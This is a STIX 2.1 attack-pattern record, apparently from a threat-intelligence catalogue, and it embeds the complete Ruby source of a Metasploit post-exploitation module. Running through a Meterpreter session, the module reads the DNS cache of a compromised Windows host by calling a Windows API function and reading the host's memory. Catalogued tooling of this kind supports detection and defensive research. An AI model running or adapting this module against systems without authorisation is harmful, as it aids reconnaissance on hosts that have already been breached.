{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bc02501a-5ac3-4677-a00d-10f310a0f0c6",
    "created": "2024-08-14T16:33:05.010129Z",
    "modified": "2024-08-14T16:33:05.010133Z",
    "name": "Windows Gather DNS Cache",
    "description": "This module displays the records stored in the DNS cache. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/dnscache_dump.rb",
            "external_id": "dnscache_dump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather DNS Cache',\n        'Description' => %q{ This module displays the records stored in the DNS cache.},\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_railgun_memread\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    rtable = Rex::Text::Table.new(\n      'Header' => 'DNS Cached Entries',\n      'Indent' => 3,\n      'Columns' => ['TYPE', 'DOMAIN']\n    )\n\n    client.railgun.add_dll('dnsapi') if !client.railgun.get_dll('dnsapi')\n    client.railgun.add_function('dnsapi', 'DnsGetCacheDataTable', 'DWORD', [['PBLOB', 'cacheEntries', 'inout']])\n    result = client.railgun.dnsapi.DnsGetCacheDataTable('aaaa')\n    address = result['cacheEntries'].unpack1('V')\n\n    # typedef struct _DNS_CACHE_ENTRY\n    # \tstruct _DNS_CACHE_ENTRY* pNext;\n    # \tPWSTR pszName;\n    # \tunsigned short wType;\n    # \tunsigned short wDataLength;\n    # \tunsigned long dwFlags;\n\n    while (address != 0)\n      struct_pointer = client.railgun.memread(address, 10)\n      # Get the pointer to the DNS record name\n      domain_pointer = struct_pointer[4, 4].unpack1('V')\n      dns_type = struct_pointer[8, 2].unpack1('h*').reverse\n      # According to the restrictions on valid host names, we read a maximum of 255 characters for each entry\n      domain_name = client.railgun.memread(domain_pointer, 255).split(\"\\x00\\x00\").first\n      rtable << [dns_type, domain_name]\n      # Get the next _DNS_CACHE_ENTRY struct pointer\n      address = struct_pointer[0, 4].unpack1('V')\n    end\n    print_status(rtable.to_s)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}